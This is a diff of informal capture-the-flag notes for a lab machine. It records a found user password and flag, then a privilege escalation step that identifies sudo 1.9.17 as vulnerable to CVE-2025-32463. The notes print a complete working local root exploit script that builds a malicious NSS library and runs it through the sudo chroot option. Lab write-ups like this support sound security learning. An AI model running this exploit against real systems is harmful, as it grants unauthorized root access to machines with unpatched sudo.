@@ -1,6 +1,3 @@
-
-
-orginial notes:
 ip “10.10.11.87”
 
 no info on it, lets see what's up
@@ -245,3 +242,62 @@ so ike@express.htb has a password of “freakingrockstarontheroad”
 and we're in!
 
 user flag: “5e0bc7960d69ea9b1e64dc8c5f829ade”
+
+
+so we get inside here and we can stasrt checking stuff out. so sudo -l and we don't have permissions without a password
+
+sudo -v and we see that:
+ike@expressway:~$ sudo -V
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+
+so we can look and see that 1.9.17 is vulnerable
+
+also, when we try to use sudo -l and sudo id, we get a custom msg, “sorry, try again” which means that it's custom
+
+if we which sudo, that is find hwere sudo is coming from, we see that its /usr/local/bin/sudo
+
+we google sudo 1.9.17 and we find a script for PE:
+
+Sudo version 1.9.17 has multiple vulnerabilities, including a critical local privilege escalation flaw
+
+googling CVE-2025-32463 we find a github with a few cracks
+
+:https://github.com/kh4sh3i/CVE-2025-32463
+
+#!/bin/bash
+# sudo-chwoot.sh
+# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
+#                  @ Stratascale Cyber Research Unit (CRU)
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd ${STAGE?} || exit 1
+
+cat > woot1337.c<<EOF
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void woot(void) {
+  setreuid(0,0);
+  setregid(0,0);
+  chdir("/");
+  execl("/bin/bash", "/bin/bash", NULL);
+}
+EOF
+
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "woot!"
+sudo -R woot woot
+rm -rf ${STAGE?}
+
+now we have root access!
+
+to do this we created a file, changed the permissions and moved on
+
+691f87d5510e282bf6c0da395a7d6cb4
